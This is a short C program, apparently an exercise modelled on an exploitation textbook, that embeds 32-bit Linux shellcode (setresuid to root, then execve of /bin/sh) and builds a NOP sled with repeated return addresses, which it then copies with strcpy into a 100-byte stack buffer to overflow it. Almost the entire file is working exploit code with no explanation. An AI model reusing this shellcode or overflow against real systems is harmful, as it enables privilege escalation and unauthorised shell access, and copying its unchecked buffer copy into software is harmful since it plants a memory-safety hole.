#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <unistd.h>
#include "hacking.h"

#define FILENAME "/var/notes"

char shellcode[]=
  "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
  "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
  "\xe1\xcd\x80";

char *inject_overflow(int argc, char *argv[]) {
  unsigned int i, ret, size, offset=0;
  char *buffer;

  size = atoi(argv[1]);
  buffer = (char *) malloc(size + 1);
  bzero(buffer, size); 

  if (argc > 2)
    offset = atoi(argv[2]);

  ret = (unsigned int) &i + offset;
  printf("ret address is 0x%x\n", ret);
 
  for (i=0; i < size; i+=4)
    *((unsigned int *)(buffer+i)) = ret;

  memset(buffer + size, 0x00, 1);
  memset(buffer, 0x90, 32);
  memcpy(buffer+32, shellcode, sizeof(shellcode)-1);

  return buffer;
}

int main(int argc, char *argv[])
{
  int userid, printing=1, fd;
  char searchstring[100];
  char *ret_val;

  if (argc > 1) {
    ret_val = inject_overflow(argc, argv);
    printf("searchstring address is %p\n", &searchstring);
    strcpy(searchstring, ret_val);
  } else
    searchstring[0] = 0;

  printf("%s\n", "finalizando...");
  return 0;
}
